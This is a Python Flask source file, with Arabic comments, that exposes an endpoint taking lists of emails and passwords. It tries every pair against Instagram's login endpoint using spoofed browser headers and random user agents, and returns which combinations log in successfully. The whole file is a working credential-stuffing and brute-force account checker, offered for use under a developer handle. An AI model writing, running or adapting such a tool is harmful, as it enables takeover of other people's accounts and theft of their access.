from flask import Flask, request, jsonify
import requests
from user_agent import generate_user_agent

app = Flask(__name__)

@app.route('/check_instagram', methods=['POST'])
def check_instagram():
    # استلام البيانات من الطلب
    data = request.json
    if not data or 'emails' not in data or 'passwords' not in data:
        return jsonify({"error": "Missing required fields: emails, passwords"}), 400
    
    emails = data['emails']  # قائمة الإيميلات
    passwords = data['passwords']  # قائمة كلمات المرور

    results = []  # قائمة لتخزين نتائج التحقق
    url = 'https://www.instagram.com/accounts/login/ajax/'
    session = requests.Session()

    for email in emails:
        for password in passwords:
            # إعداد الهيدرز للطلب
            headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip,deflate,br',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                'content-length': '269',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': generate_user_agent(),
                'x-csrftoken': 'missing',
                'x-ig-app-id': '936619743392459',
                'x-instagram-ajax': '8a8118fa7d40',
                'x-requested-with': 'XMLHttpRequest'
            }

            # إعداد البيانات للطلب
            payload = {
                'username': email,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            # إرسال الطلب
            response = session.post(url, headers=headers, data=payload)

            # تحليل النتيجة
            if 'userId' in response.text:
                results.append({
                    "email": email,
                    "password": password,
                    "status": "Valid",
                })
                break  # إذا كان الحساب صالحًا، نوقف البحث عن كلمات مرور أخرى لهذا الإيميل
            else:
                results.append({
                    "email": email,
                    "password": password,
                    "status": "Invalid",
                })

    # إرجاع النتيجة كـ JSON
    return jsonify({
        "results": results,
        "api_speed": "Fast",
        "developer": "HP LVL😎"
    })

if __name__ == '__main__':
    app.run(debug=True)
